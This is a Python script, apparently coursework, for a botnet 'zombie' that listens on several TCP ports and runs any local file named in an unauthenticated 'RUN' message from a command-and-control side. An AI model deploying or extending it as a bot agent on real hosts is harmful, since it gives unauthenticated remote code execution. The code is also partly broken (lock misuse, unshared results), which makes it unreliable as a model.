#!/usr/bin/python3

#####################################
# Zombie controlled by the          #
# command and control               #
#                                   #
#                                   #
# Preston Dickerson                 #
#                                   #
#####################################


# Function that buffers the request from the command and control

from asyncio import Lock
from logging import Manager
from multiprocessing import Process
import subprocess
import os
import select
import socket
import sys

# Global dictionary for results and lock
resultsDict = {}
resultsLock = Lock()


def bufferRequest(connectionSocket):
    finalBuffer = ""
    # run the loop until no buffers are left or the carriage return new line character sequence is found
    while True:
        # Get 1024 bytes of information
        buffer = connectionSocket.recv(1024).decode()
        if not buffer:
            break
        finalBuffer += buffer
        if '\r\n\r\n' in finalBuffer:
            break  # Break the loop when the end of the request headers is reached
    
    return finalBuffer

def parseRequest(request):
    # Get each line for looking at the carriage return and the new line characters
    lines = request.split()
    method = ""
    file = ""
    try:
        # Check if there are enough lines to proceed
        if len(lines) > 0:
            # Get the method, path, and remaining parts
            method, file = lines[0], lines[1]
    except ValueError:
        method = None
        file = None

    return method, file
    
def runFile(path, resultsDict, resultsLock, port):
    try:
        # Use subprocess.run to capture the output of the script
        result = subprocess.run(["./" + path], capture_output=True, text=True)

        # Assuming you want to capture both stdout and stderr
        output = result.stdout + result.stderr

        # Check the return code
        if result.returncode == 0:
            # Use the lock to ensure thread-safe dictionary update
            with resultsLock:
                if port not in resultsDict:
                    resultsDict[port] = {}
                resultsDict[port][path] = output
    except Exception as e:
        # Handle exceptions, e.g., if the script couldn't be executed
        with resultsLock:
            if port not in resultsDict:
                resultsDict[port] = {}
            resultsDict[port][path] = f"Error executing script: {str(e)}"



    
def handleRun(connectionSocket, path):
    print("running handleRun")

    # If the path exists and it is a file, go there
    if os.path.exists("./" + path) and os.path.isfile("./" + path):

        localAddress = connectionSocket.getsockname()
        port = localAddress[1]

        # Run the file in a new thread
        p = Process(target=runFile, args=("./" + path, resultsDict, resultsLock, port))
        p.start()
        
        # Fill out the response headers
        responseHeaders = [
            "OK",
        ]

        responseBody = "Script is successfully running"

        # Form the response with the response body
        response = "\r\n".join(responseHeaders) + "\r\n" + responseBody + "\r\n\r\n"

        # Send the Response
        connectionSocket.send(response.encode())
    # Send FAIL if file not found
    else:
        response = "FAIL\r\nFile not found\r\n\r\n"
        connectionSocket.send(response.encode())


# Runs a single thread response in the server
def runServerThread(connectionSocket):
    while True:
        # Buffer the request
        request = bufferRequest(connectionSocket)

        # Parse the request
        method, file = parseRequest(request)

        if method == None or file == None:
            continue

        # If it is a GET request, send to handleGet
        if "RUN" in method:
            handleRun(connectionSocket, file)
        # # If it is a HEAD request, send to handleHead
        # elif "REPORT" in method:
        #     handleReport(connectionSocket, file, connection)
        # else:
        #     handleStop(connectionSocket, file, connection)

def main():
        # Get the command for what we are connecting to, throw an error if there is not command line argument
    if len(sys.argv) < 2:
        print("Please enter arguments like this: ./myserver.py <Port1> <Port2> <Port3>.")
        return
    
    # Setup the server sockets
    serverSockets = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(len(sys.argv)-1)]
    for i, serverSocket in enumerate(serverSockets):
        # Get the server port
        serverPort = int(sys.argv[i+1])
        
        # Set the SO_REUSEADDR option to allow reuse of the address (Want this for after termination)
        serverSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # Bind to the server port
        serverSocket.bind(('', serverPort))

        # Listen at that server port
        serverSocket.listen(3)
        print(f"Server is listening at Port {serverPort}")

    processes = []

    # Use select to keep track of all server sockets
    while True:
        read, _, _ = select.select(serverSockets, [], [], 5)  # '5' for non-blocking
        for s in read:
            connectionSocket, addr = s.accept()
            
            p = Process(target=runServerThread, args=(connectionSocket,))
            p.start()

            processes.append(p)

main()